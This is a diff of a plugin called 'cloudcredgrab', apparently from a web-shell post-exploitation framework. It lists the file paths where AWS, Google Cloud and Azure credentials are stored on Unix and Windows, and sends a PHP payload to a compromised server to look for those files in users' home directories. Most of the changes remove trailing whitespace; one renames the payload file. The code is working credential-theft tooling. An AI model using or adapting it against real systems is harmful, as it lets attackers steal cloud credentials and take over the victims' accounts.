@@ -8,7 +8,7 @@ DESCRIPTION:
     by looking in user's directory
 
 EXAMPLES:
-    > cloudcredgrab 
+    > cloudcredgrab
       - look for all cloud credentials in all user directories
     > cloudcredgrab -u www aws
       - look for AWS credentials in www's user files
@@ -29,20 +29,20 @@ import plugin_args
 opt = plugin_args.parse(plugin.argv[1:])
 
 UNIX_FILES = {'aws': ['.aws/credentials', ],
-              'google': ['.config/gcloud/legacy_credentials', 
-                         '.config/gcloud/credentials.db', 
+              'google': ['.config/gcloud/legacy_credentials',
+                         '.config/gcloud/credentials.db',
                          '.config/gcloud/access_tokens.db'],
-              'azure': ['.azure/accessTokens.json', 
+              'azure': ['.azure/accessTokens.json',
                         '.azure/azureProfile.json']}
 WINDOWS_FILES = {'aws': [".aws\\credentials",],
-                 'google': ["\\AppData\\Roaming\\gcloud\\legacy_credentials", 
-                            "\\AppData\\Roaming\\gcloud\\credentials.db", 
+                 'google': ["\\AppData\\Roaming\\gcloud\\legacy_credentials",
+                            "\\AppData\\Roaming\\gcloud\\credentials.db",
                             "\\AppData\\Roaming\\gcloud\\access_tokens.db"],
                  'azure': [".azure\\accessTokens.json", ".azure\\azureProfile.json"]}
 
 if environ['PLATFORM'].startswith("win"):
     FILES = WINDOWS_FILES
-else: 
+else:
     FILES = UNIX_FILES
 
 if opt["platform"]:
@@ -51,7 +51,7 @@ else:
     SEARCH_FOR = list(itertools.chain.from_iterable(FILES.values()))
 
 # Send payload
-payload = server.payload.Payload("cloudcredgrab.php")
+payload = server.payload.Payload("payload.php")
 payload['USER'] = opt['user'] or "all"
 payload['SEARCH_FOR'] = SEARCH_FOR
 
